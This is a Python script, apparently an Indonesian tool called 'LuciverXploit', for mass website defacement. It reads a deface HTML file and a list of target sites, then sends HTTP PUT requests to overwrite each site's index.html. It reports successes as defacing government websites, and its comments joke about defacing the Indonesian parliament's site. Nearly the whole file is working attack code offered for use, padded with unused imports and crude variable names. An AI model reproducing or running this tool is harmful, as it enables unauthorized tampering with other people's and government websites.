#LuciverXD Punya
#Jangan Deface Web DPR kalau ngk mau di tangkap xixixi
#github : LuciverXD
#yang Recode Anak Haram
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as luciana
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')

pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
uidl =[]
opsi=[]
uidf=[]
liu=[]
luci = []
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; LUCIVERXPLOIT DEFACER INDONESIA\x07')
def luciverxploit(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\x1b[1;93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
try:
   import os
   import sys
   import time
   import random
   import os.path
   import requests
   import threading
except ImportError:
   exit("install requests and try again ...(pip install requests")
os.system("git pull")
os.system("clear")
red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"
colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]
color1, color2, color3, color4, color5 = random.sample(colors,5)
os.system('clear')
def animate():
    text = "sedang upload Shell"
    while True:
        for i in range(len(text)):
            print(text[:i] + "_" + text[i+1:], end="\r")
            time.sleep(0.1)
def eagle(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)   
   return str(ipt)
def white(script, target_file="targets.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print(" ")
        cetak(panel(f"[bold white]                      Jumlah Target Yang Terbaca {target} Website",width=100,style=f"bold green"))	
        print(" ")
	# start the animation thread
        t = threading.Thread(target=animate)
        t.daemon = True  # allow the thread to be killed when the main program ends
        t.start()                
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/index.html", data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    cetak(panel(f"[bold red]FAILED DEFACE WEB PEMERINTAH ✓ | {site}{script}",width=100,style=f"bold green"))	
                else:
                    cetak(panel(f"[bold green]SUKSES DEFACE WEB PEMERINTAH ✓ | {site}{script}",width=100,style=f"bold green"))	
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()
def main(banner):
   banner()
   while True:
      try:
         cetak(panel(f"[bold white]                      Masukan SC deface Yang Kami Miliki Berformat .html",width=100,style=f"bold green"))	
         a = eagle(green+"[\x1b[1;91m● \x1b[1;93m● \x1b[1;92m● ]\033[0m \x1b[1;97mMasukan SC Deface nya \x1b[1;93m[contoh: defacescript.html]\n\x1b[1;92m➢ • \x1b[1;97m ")
         if not os.path.isfile(a):
            print(' ')
            print(red+bold+"	file '%s' Folder Tidak di temukan !"%(a))
            print(" ")
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()
   white(a)
def banner():
	cetak(panel(f"""[bold green] 
          ▄▄▌ ▐ ▄▌ ▄ .▄▪  ▄▄▄▄▄▄▄▄ .  ·▄▄▄▄  ▄▄▄ .·▄▄▄ ▄▄▄·  ▄▄· ▄▄▄ .
          ██· █▌▐███▪▐███ •██  ▀▄.▀·  ██· ██ ▀▄.▀·▐▄▄ ▐█ ▀█ ▐█ ▌▪▀▄.▀·
          ██▪▐█▐▐▌██▀▀█▐█· ▐█.▪▐▀▀▪▄  ▐█▪ ▐█▌▐▀▀▪▄█  ▪▄█▀▀█ ██ ▄▄▐▀▀▪▄
          ▐█▌██▐█▌██▌▐▀▐█▌ ▐█▌·▐█▄▄▌  ██. ██ ▐█▄▄▌██ .▐█▪ ▐▌▐███▌▐█▄▄▌
            ▀▀▀▀ ▀▪▀▀▀ ·▀▀▀ ▀▀▀  ▀▀▀   ▀▀▀▀▀•  ▀▀▀ ▀▀▀  ▀  ▀ ·▀▀▀  ▀▀▀   
                          [bold white]𝕄𝕒𝕕𝕖 𝔹𝕪 [bold red]𝔸𝕣𝕚 𝕄𝕒𝕣𝕤𝕙𝕖𝕝𝕝𝕠 [bold blue]ℂ𝕠𝕕𝕖𝕣""",width=100,padding=(0,8),title=f"[bold white]LuciverXploit",style=f"bold green"))
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	time.sleep(3)
	main(banner)
	banner()
